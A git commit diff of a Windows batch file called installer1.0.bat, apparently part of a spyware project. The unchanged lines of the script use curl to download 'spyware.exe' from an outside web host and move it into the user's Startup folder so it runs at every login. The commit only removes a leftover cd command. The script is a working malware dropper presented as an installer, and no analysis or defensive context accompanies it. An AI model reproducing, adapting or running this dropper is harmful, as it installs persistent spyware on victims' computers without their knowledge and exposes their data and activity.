221f729c3aaf3dfdf49c5ded6876136fa5719b56
o89.Devsu <harimtim@icloud.com>
2024-06-10 19:52:43 +0200

    Update installer1.0.bat

--- installer1.0.bat
+++ installer1.0.bat
@@ -2,7 +2,4 @@ curl -O http://harimtim.de/spyware/1.0/spyware.exe
 
 move spyware.exe "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup"
 
-cd "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup" 
-
-
 exit
